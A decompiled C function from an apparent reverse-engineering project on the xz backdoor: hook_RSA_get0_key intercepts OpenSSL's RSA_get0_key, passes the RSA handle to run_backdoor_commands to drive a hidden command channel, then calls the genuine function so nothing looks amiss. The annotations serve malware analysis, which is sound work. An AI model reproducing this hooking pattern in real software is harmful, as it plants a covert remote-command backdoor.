// /home/kali/xzre-ghidra/xzregh/10A330_hook_RSA_get0_key.c
// Function: hook_RSA_get0_key @ 0x10A330
// Calling convention: __stdcall
// Prototype: void __stdcall hook_RSA_get0_key(RSA * r, BIGNUM * * n, BIGNUM * * e, BIGNUM * * d)


/*
 * AutoDoc: Mirrors the EVP hook for RSA_get0_key: any consumer that asks OpenSSL for the modulus/exponent first triggers run_backdoor_commands so the dispatcher can inspect the handle and opportunistically process commands before delegating to the real function.
 */

#include "xzre_types.h"

void hook_RSA_get0_key(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)

{
  pfn_RSA_get0_key_t orig_RSA_get0_key;
  BOOL do_orig_flag;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     // AutoDoc: Refuse to run unless the loader already discovered the original RSA_get0_key pointer.
     (orig_RSA_get0_key = global_ctx->imported_funcs->RSA_get0_key_orig,
     orig_RSA_get0_key != (pfn_RSA_get0_key_t)0x0)) {
    if (r != (RSA *)0x0) {
      // AutoDoc: Treat the modulus/exponent fetch as another opportunity to drive the RSA command channel.
      run_backdoor_commands(r,global_ctx,&do_orig_flag);
    }
                    /* Hook tail-call: after inspecting the RSA handle it calls orig_RSA_get0_key directly, so the tail jump is intentional. */
    // AutoDoc: After the dispatcher returns, immediately tail-call the genuine RSA_get0_key so callers see the untouched OpenSSL behaviour.
    (*orig_RSA_get0_key)(r,n,e,d);
    return;
  }
  return;
}

